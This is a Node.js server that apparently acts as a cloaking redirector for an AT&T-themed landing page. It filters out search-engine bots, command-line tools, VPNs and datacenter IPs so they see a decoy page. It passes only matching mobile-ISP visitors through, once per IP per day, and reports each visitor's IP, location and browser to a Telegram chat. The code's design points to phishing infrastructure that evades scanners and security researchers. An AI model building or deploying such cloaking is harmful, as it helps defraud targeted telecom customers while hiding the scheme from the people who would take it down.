const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const fs = require('fs').promises;
const fssync = require('fs');
const net = require('net');

const app = express();
const port = process.env.PORT || 3000;

// Trust proxy for accurate IP detection behind load balancers
app.set('trust proxy', 1);

// Path to store visited IPs
const VISITED_IPS_FILE = path.join(__dirname, 'visited_ips.json');
const FORCED_IPS_FILE = path.join(__dirname, 'forced_ips.json');
const SETTINGS_FILE = path.join(__dirname, 'settings.json');

// Ensure the files exist
if (!fssync.existsSync(VISITED_IPS_FILE)) {
    fssync.writeFileSync(VISITED_IPS_FILE, JSON.stringify([]));
}
if (!fssync.existsSync(FORCED_IPS_FILE)) {
    fssync.writeFileSync(FORCED_IPS_FILE, JSON.stringify([]));
}
if (!fssync.existsSync(SETTINGS_FILE)) {
    fssync.writeFileSync(SETTINGS_FILE, JSON.stringify({ 
        isSuspiciousEnabled: true,
        isIspFilterEnabled: true 
    }));
}

// Mutex-like lock for file operations
let fileLock = false;
async function withLock(fn) {
    while (fileLock) {
        await new Promise(resolve => setTimeout(resolve, 50));
    }
    fileLock = true;
    try {
        return await fn();
    } finally {
        fileLock = false;
    }
}

async function getVisitedIps() {
    try {
        const data = await fs.readFile(VISITED_IPS_FILE, 'utf8');
        let ips = JSON.parse(data);
        const now = Date.now();
        const twentyFourHours = 24 * 60 * 60 * 1000;
        return ips.filter(entry => {
            const timestamp = typeof entry === 'object' ? entry.timestamp : 0;
            return (now - timestamp) < twentyFourHours;
        });
    } catch (e) {
        return [];
    }
}

async function addVisitedIp(ip) {
    await withLock(async () => {
        const ips = await getVisitedIps();
        const existingIndex = ips.findIndex(entry => (typeof entry === 'object' ? entry.ip : entry) === ip);
        
        if (existingIndex === -1) {
            ips.push({ ip, timestamp: Date.now() });
            await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
        } else if (typeof ips[existingIndex] !== 'object') {
            ips[existingIndex] = { ip, timestamp: Date.now() };
            await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
        }
    });
}

async function removeVisitedIp(ip) {
    await withLock(async () => {
        const ips = await getVisitedIps();
        const newIps = ips.filter(entry => (typeof entry === 'object' ? entry.ip : entry) !== ip);
        await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(newIps, null, 2));
    });
}

async function clearVisitedIps() {
    await withLock(async () => {
        await fs.writeFile(VISITED_IPS_FILE, JSON.stringify([], null, 2));
    });
}

async function getForcedIps() {
    try {
        const data = await fs.readFile(FORCED_IPS_FILE, 'utf8');
        return JSON.parse(data);
    } catch (e) {
        return [];
    }
}

async function addForcedIp(ip) {
    await withLock(async () => {
        const ips = await getForcedIps();
        if (!ips.includes(ip)) {
            ips.push(ip);
            await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(ips, null, 2));
        }
    });
}

async function removeForcedIp(ip) {
    await withLock(async () => {
        const ips = await getForcedIps();
        const newIps = ips.filter(i => i !== ip);
        await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(newIps, null, 2));
    });
}

async function getSettings() {
    try {
        const data = await fs.readFile(SETTINGS_FILE, 'utf8');
        const settings = JSON.parse(data);
        return {
            isSuspiciousEnabled: true,
            isIspFilterEnabled: true,
            ...settings
        };
    } catch (e) {
        return { isSuspiciousEnabled: true, isIspFilterEnabled: true };
    }
}

async function updateSettings(newSettings) {
    return await withLock(async () => {
        const settings = await getSettings();
        const updated = { ...settings, ...newSettings };
        await fs.writeFile(SETTINGS_FILE, JSON.stringify(updated, null, 2));
        return updated;
    });
}

function escapeHtml(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// IMPORTANT: These environment variables must be provided by the hosting environment
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE;
const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const MOBILE_ISPS = (process.env.MOBILE_ISPS || "").split(',').map(isp => isp.trim()).filter(isp => isp !== "");

const missingEnvVars = [];
if (!ADMIN_TOKEN) missingEnvVars.push('ADMIN_TOKEN');
if (!TELEGRAM_BOT_TOKEN) missingEnvVars.push('TELEGRAM_BOT_TOKEN');
if (!TELEGRAM_CHAT_ID) missingEnvVars.push('TELEGRAM_CHAT_ID');
if (!ATT_LANDING_PAGE) missingEnvVars.push('ATT_LANDING_PAGE');
if (!NON_ATT_LANDING_PAGE) missingEnvVars.push('NON_ATT_LANDING_PAGE');

if (missingEnvVars.length) {
    console.error(`FATAL ERROR: Missing required environment variables: ${missingEnvVars.join(', ')}. Set them in Render service settings.`);
    process.exit(1);
}

console.log('Environment variables loaded for production: ' +
    `ADMIN_TOKEN=${!!ADMIN_TOKEN}, ` +
    `TELEGRAM_BOT_TOKEN=${!!TELEGRAM_BOT_TOKEN}, ` +
    `TELEGRAM_CHAT_ID=${!!TELEGRAM_CHAT_ID}, ` +
    `ATT_LANDING_PAGE=${!!ATT_LANDING_PAGE}, ` +
    `NON_ATT_LANDING_PAGE=${!!NON_ATT_LANDING_PAGE}, ` +
    `MOBILE_ISPS count=${MOBILE_ISPS.length}`
);

const BOT_USER_AGENTS = [
    'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'slurp', 'baiduspider', 'facebot', 'ia_archiver',
    'crawler', 'spider', 'robot', 'curl', 'wget', 'python', 'postman', 'insomnia', 'headless'
];

// Security: Use Helmet for security headers
app.use(helmet({
    contentSecurityPolicy: true, // Set to false if you have complex external scripts
}));

// Crawler Protection: Set X-Robots-Tag to prevent indexing
app.use((req, res, next) => {
    res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive');
    next();
});

// Rate Limiting: Prevent abuse
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per window
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many requests, please try again later.'
});
app.use(limiter);

app.use(express.json());
app.use(cors());

// Handle favicon to avoid 404 logs
app.get('/favicon.ico', (req, res) => res.status(204).end());

// Serve only the index.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve robots.txt to disallow all crawlers
app.get('/robots.txt', (req, res) => {
    res.type('text/plain');
    res.send("User-agent: *\nDisallow: /");
});

// Helper to check for bots
function isBot(req) {
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    if (!ua) return true;
    return BOT_USER_AGENTS.some(bot => ua.includes(bot));
}

// Admin Authentication Middleware
function requireAdmin(req, res, next) {
    // Allow token in header (for API) or query (for initial page load)
    const token = req.headers['x-admin-token'] || req.query.token;
    if (token !== ADMIN_TOKEN) {
        return res.status(401).send('Unauthorized: Invalid Admin Token');
    }
    next();
}

// Main endpoint to determine redirect
app.get('/init', async (req, res) => {
    if (isBot(req)) {
        return res.json({ redirect: NON_ATT_LANDING_PAGE });
    }

    let clientIp = req.ip;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // Validate IP to prevent spoofing/XSS via headers
    if (!net.isIP(clientIp)) {
        console.warn(`[Init] Invalid IP detected: ${clientIp}`);
        return res.status(400).send('Invalid IP address');
    }

    console.log(`[Init] Visit from IP: ${clientIp} | UA: ${userAgent}`);
    
    // 1. FAST CHECKS (Local memory/file only)
    const forcedIps = await getForcedIps();
    const isForced = forcedIps.includes(clientIp);

    if (isForced) {
        console.log(`[Init] IP ${clientIp} is forced. Redirecting to ATT page.`);
        // Send simplified notification for forced visit (optional, but keep it consistent)
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: `✨ *FORCED REDIRECT VISIT* \n\n📍 *IP:* ${clientIp}\n💻 *Browser:* ${userAgent}\n🕒 *Time:* ${new Date().toLocaleString()}`,
                parse_mode: 'Markdown'
            });
        } catch (e) {
            console.error('[Telegram] Forced visit notification failed:', e.response?.data || e.message);
        }
        return res.json({ redirect: '/go-att' });
    }

    const visitedIps = await getVisitedIps();
    const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
    
    if (isVisited) {
        console.log(`[Init] IP ${clientIp} already visited. Redirecting to safe page.`);
        return res.json({ redirect: NON_ATT_LANDING_PAGE });
    }

    // 2. FETCH EXTERNAL DATA (Slowest part)
    let data = null;
    try {
        const response = await axios.get(`https://demo.ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`, { timeout: 5000 });
        data = response.data;
        console.log(`[Init] ISP Lookup:`, data);
    } catch (error) {
        console.error('[Init] ISP lookup failed:', error.message);
    }

    // 3. SECURITY CHECKS
    const isProxy = data && data.proxy === true;
    const isHosting = data && data.hosting === true;
    const isSuspicious = isProxy || isHosting;
    const settings = await getSettings();

    // Send Telegram Notification
    let message = `🚀 *New App Visit!* \n\n`;
    if (isProxy) message += `🚫 *VPN/PROXY DETECTED*\n\n`;
    else if (isHosting) message += `☁️ *DATACENTER/HOSTING DETECTED*\n\n`;

    if (data && data.status === 'success') {
        message += `📍 *IP:* ${data.query}\n` +
                   `🏢 *ISP:* ${data.isp || data.org || 'N/A'}\n` +
                   `🌍 *Location:* ${data.city}, ${data.regionName}, ${data.country}\n`;
    } else {
        message += `📍 *IP:* ${clientIp}\n⚠️ *ISP info unavailable*\n`;
    }
    
    message += `💻 *Browser:* ${userAgent}\n`;
    if (isSuspicious) message += `🛡️ *Flags:* ${isProxy ? 'Proxy/VPN ' : ''}${isHosting ? 'DataCenter' : ''}\n`;
    message += `🕒 *Time:* ${new Date().toLocaleString()}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        }, { timeout: 5000 });
        console.log('[Telegram] Notification successfully sent for IP:', clientIp);
    } catch (e) {
        console.error('[Telegram] Notification failed:', e.response?.data || e.message);
    }

    // 4. FINAL REDIRECT LOGIC
    let targetUrl = NON_ATT_LANDING_PAGE;
    const isSuspiciousMatch = settings.isSuspiciousEnabled && (isProxy || isHosting);
    
    if (isSuspiciousMatch) {
        console.log(`[Init] Suspicious IP (Proxy:${isProxy}/Hosting:${isHosting}) detected. Filter is ON. Redirecting to safe page.`);
        targetUrl = NON_ATT_LANDING_PAGE;
    } else if (!settings.isIspFilterEnabled) {
        console.log(`[Init] ISP Filter is DISABLED. Redirecting all clean traffic to ATT page.`);
        targetUrl = '/go-att';
    } else if (data && data.status === 'success') {
        const userISP = (data.isp || data.org || "").toUpperCase();
        if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
            console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
            targetUrl = '/go-att';
        } else {
            console.log(`[Init] No ISP match for: ${userISP}. Redirecting to safe page.`);
            targetUrl = NON_ATT_LANDING_PAGE;
        }
    }

    res.json({ redirect: targetUrl });
});

// Admin Panel to manage visited IPs
app.get('/admin', requireAdmin, async (req, res) => {
    const ips = await getVisitedIps();
    const forcedIps = await getForcedIps();
    const settings = await getSettings();
    let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Panel</title>
            <style>
                body { font-family: sans-serif; padding: 20px; background: #f9f9f9; }
                .container { max-width: 900px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                section { margin-bottom: 40px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
                table { border-collapse: collapse; width: 100%; margin-top: 20px; }
                th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
                th { background-color: #f4f4f4; }
                .remove-btn { color: #d9534f; cursor: pointer; font-weight: bold; }
                .remove-btn:hover { text-decoration: underline; }
                .add-section { margin-top: 20px; display: flex; gap: 10px; }
                input[type="text"] { padding: 8px; border: 1px solid #ddd; border-radius: 4px; flex-grow: 1; }
                button { padding: 8px 16px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
                button:hover { background: #0056b3; }
                .status { color: #666; font-size: 0.9em; }
                .toggle-container { display: flex; align-items: center; gap: 10px; margin-top: 10px; }
                /* Simple Toggle Switch CSS */
                .switch { position: relative; display: inline-block; width: 60px; height: 34px; }
                .switch input { opacity: 0; width: 0; height: 0; }
                .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
                .slider:before { position: absolute; content: ""; height: 26px; width: 26px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
                input:checked + .slider { background-color: #2196F3; }
                input:focus + .slider { box-shadow: 0 0 1px #2196F3; }
                input:checked + .slider:before { transform: translateX(26px); }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Admin Panel</h1>

                <section>
                    <h2>General Settings</h2>
                    <div class="toggle-container">
                        <span>Enable "isSuspicious" Filter:</span>
                        <label class="switch">
                            <input type="checkbox" id="isSuspiciousToggle" ${settings.isSuspiciousEnabled ? 'checked' : ''}>
                            <span class="slider"></span>
                        </label>
                    </div>
                    <p class="status">If enabled, visits flagged as proxies/hosting will be automatically blocked.</p>

                    <div class="toggle-container" style="margin-top: 20px;">
                        <span>Enable "Mobile ISP" Filter:</span>
                        <label class="switch">
                            <input type="checkbox" id="isIspFilterToggle" ${settings.isIspFilterEnabled ? 'checked' : ''}>
                            <span class="slider"></span>
                        </label>
                    </div>
                    <p class="status">If disabled, <b>ANY</b> legitimate visitor (not suspicious) will be redirected to the AT&T page, regardless of their ISP.</p>
                </section>

                <section>
                    <h2>Forced Redirect IPs</h2>
                    <p class="status">Any IP added here will <b>always</b> be redirected to the AT&T landing page, bypassing ISP checks.</p>
                    <div class="add-section">
                        <input type="text" id="forcedIpInput" placeholder="Enter IP address (e.g., 1.2.3.4)">
                        <button id="addForcedBtn">Add to Forced List</button>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>IP Address</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${forcedIps.map(ip => `
                                <tr>
                                    <td>${escapeHtml(ip)}</td>
                                    <td><span class="remove-btn forced-remove" data-ip="${escapeHtml(ip)}">Remove</span></td>
                                </tr>
                            `).join('')}
                            ${forcedIps.length === 0 ? '<tr><td colspan="2">No IPs in forced list</td></tr>' : ''}
                        </tbody>
                    </table>
                </section>

                <section>
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <h2>Recently Visited IPs (Restricted)</h2>
                        <button id="clearVisitedBtn" style="background: #d9534f;">Allow Revisit for All</button>
                    </div>
                    <p class="status">Users who visited the AT&T landing page within the last 24 hours. They are currently blocked from revisiting.</p>
                    <table>
                        <thead>
                            <tr>
                                <th>IP Address</th>
                                <th>Visited At</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${ips.map(entry => {
                                const ip = typeof entry === 'object' ? entry.ip : entry;
                                const time = typeof entry === 'object' ? new Date(entry.timestamp).toLocaleString() : 'N/A';
                                return `
                                    <tr>
                                        <td>${escapeHtml(ip)}</td>
                                        <td>${escapeHtml(time)}</td>
                                        <td><span class="remove-btn visited-remove" data-ip="${escapeHtml(ip)}">Allow Revisit</span></td>
                                    </tr>
                                `;
                            }).join('')}
                            ${ips.length === 0 ? '<tr><td colspan="3">No restricted visits in the last 24 hours</td></tr>' : ''}
                        </tbody>
                    </table>
                </section>
            </div>

            <script>
                const getAdminToken = () => new URLSearchParams(window.location.search).get('token');

                document.getElementById('isSuspiciousToggle').addEventListener('change', async (e) => {
                    const isEnabled = e.target.checked;
                    const response = await fetch('/api/admin/settings/update', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'x-admin-token': getAdminToken() },
                        body: JSON.stringify({ isSuspiciousEnabled: isEnabled })
                    });
                    if (!response.ok) {
                        alert('Failed to update setting');
                        e.target.checked = !isEnabled;
                    }
                });

                document.getElementById('isIspFilterToggle').addEventListener('change', async (e) => {
                    const isEnabled = e.target.checked;
                    const response = await fetch('/api/admin/settings/update', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'x-admin-token': getAdminToken() },
                        body: JSON.stringify({ isIspFilterEnabled: isEnabled })
                    });
                    if (!response.ok) {
                        alert('Failed to update setting');
                        e.target.checked = !isEnabled;
                    }
                });

                document.getElementById('addForcedBtn').addEventListener('click', async () => {
                    const ip = document.getElementById('forcedIpInput').value.trim();
                    if (!ip) return alert('Please enter an IP');
                    
                    const response = await fetch('/api/admin/forced/add', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'x-admin-token': getAdminToken() },
                        body: JSON.stringify({ ip })
                    });
                    
                    if (response.ok) {
                        window.location.reload();
                    } else {
                        const errorText = await response.text();
                        alert('Error (' + response.status + '): ' + errorText);
                    }
                });

                document.addEventListener('click', async (e) => {
                    if (e.target.classList.contains('remove-btn')) {
                        const ip = e.target.getAttribute('data-ip');
                        const isForced = e.target.classList.contains('forced-remove');
                        const url = isForced ? '/api/admin/forced/remove' : '/api/admin/remove';
                        const confirmMsg = isForced ? 
                            'Remove ' + ip + ' from forced redirect list?' : 
                            'Allow ' + ip + ' to revisit the landing page?';

                        if (confirm(confirmMsg)) {
                            const response = await fetch(url, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json', 'x-admin-token': getAdminToken() },
                                body: JSON.stringify({ ip })
                            });
                            
                            if (response.ok) {
                                window.location.reload();
                            } else {
                                const errorText = await response.text();
                                alert('Failed (' + response.status + '): ' + errorText);
                            }
                        }
                    }
                });

                document.getElementById('clearVisitedBtn').addEventListener('click', async () => {
                    if (confirm('Are you sure you want to allow revisit for ALL recently visited IPs?')) {
                        const response = await fetch('/api/admin/clear-visited', {
                            method: 'POST',
                            headers: { 'x-admin-token': getAdminToken() }
                        });
                        
                        if (response.ok) {
                            window.location.reload();
                        } else {
                            const errorText = await response.text();
                            alert('Failed (' + response.status + '): ' + errorText);
                        }
                    }
                });
            </script>
        </body>
        </html>
    `;
    res.send(html);
});

// Endpoint to remove an IP from the visited list
app.post('/api/admin/remove', requireAdmin, async (req, res) => {
    const { ip } = req.body;
    if (!ip) return res.status(400).send('IP is required');
    await removeVisitedIp(ip);
    res.status(200).send('IP removed successfully');
});

// Endpoint to clear all visited IPs
app.post('/api/admin/clear-visited', requireAdmin, async (req, res) => {
    await clearVisitedIps();
    res.status(200).send('All visited IPs cleared successfully');
});

// Endpoint to add an IP to forced redirect list
app.post('/api/admin/forced/add', requireAdmin, async (req, res) => {
    const { ip } = req.body;
    console.log(`[Admin] Request to add forced IP: ${ip}`);
    if (!ip || !net.isIP(ip)) return res.status(400).send('Valid IP is required');
    await addForcedIp(ip);
    res.status(200).send('IP added to forced list');
});

// Endpoint to remove an IP from forced redirect list
app.post('/api/admin/forced/remove', requireAdmin, async (req, res) => {
    const { ip } = req.body;
    console.log(`[Admin] Request to remove forced IP: ${ip}`);
    if (!ip) return res.status(400).send('IP is required');
    await removeForcedIp(ip);
    res.status(200).send('IP removed from forced list');
});

// Endpoint to update general settings
app.post('/api/admin/settings/update', requireAdmin, async (req, res) => {
    const { isSuspiciousEnabled, isIspFilterEnabled } = req.body;
    const update = {};
    
    if (typeof isSuspiciousEnabled === 'boolean') update.isSuspiciousEnabled = isSuspiciousEnabled;
    if (typeof isIspFilterEnabled === 'boolean') update.isIspFilterEnabled = isIspFilterEnabled;
    
    if (Object.keys(update).length === 0) return res.status(400).send('Invalid setting value');
    
    await updateSettings(update);
    res.status(200).send('Settings updated');
});

// Redirect to AT&T landing page
app.get('/go-att', async (req, res) => {
    const clientIp = req.ip;
    if (!net.isIP(clientIp)) {
        return res.status(400).send('Invalid IP address');
    }
    await addVisitedIp(clientIp);
    res.redirect(ATT_LANDING_PAGE);
});

// Secured Telegram API
app.post('/api/telegram', async (req, res) => {
    if (isBot(req)) return res.status(403).send('Forbidden');

    const { message } = req.body;
    if (!message) return res.status(400).send('Message is required');

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        res.status(200).send('Message sent successfully');
    } catch (error) {
        console.error('Error sending message:', error.response?.data || error.message);
        res.status(500).send('Failed to send message');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
